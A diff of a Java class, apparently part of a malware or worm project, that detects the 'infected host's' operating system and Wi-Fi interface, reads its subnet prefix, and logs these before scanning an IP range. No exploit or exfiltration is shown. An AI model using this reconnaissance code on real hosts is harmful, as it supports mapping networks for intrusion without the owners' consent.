@@ -39,32 +39,35 @@ public class Wu_taiChin {
     }
   }
 
-  public static void HostAddress() {
-
-  }
-
   public static void main(String[] args) {
-    // Get internal address
     String address = null;
     short mask = 0;
     BufferedWriter wTo = logging();
-
+    int x = 0;
+    // Get Host Nic address //
     try {
       NetworkInterface nic = NetworkInterface.getByName("");
       String OS = System.getProperty("os.name");
-      System.out.println(OS); // comment out for file writing
-      wTo.append("Operating system of infected host is: " + OS + "\n");// comment out for system viewing
+      
+      //options for viewing results //
+      System.out.println(OS);
+      wTo.append("Operating system of infected host is: " + OS + "\n");
+      
       if ("Windows".equals(OS)) {
         nic = NetworkInterface.getByName("Wireless LAN adapter Wi-Fi");
       }
-      if ("Linux".equals(OS)) {
+      else if ("Linux".equals(OS)) {
         nic = NetworkInterface.getByName("wlan0");
       }
-      int x = 0;
+      else{
+        System.out.println("Unsupported opperating System.");
+      }
+
       do {
         mask = nic.getInterfaceAddresses().get(x).getNetworkPrefixLength();
         x += 1;
       } while (mask > 32);
+      
       System.out.println(mask); // comment out for file writing
       wTo.append("Subnet of infected host is: " + mask + "\n"); // comment out for system viewing
       ip_range(mask, wTo);
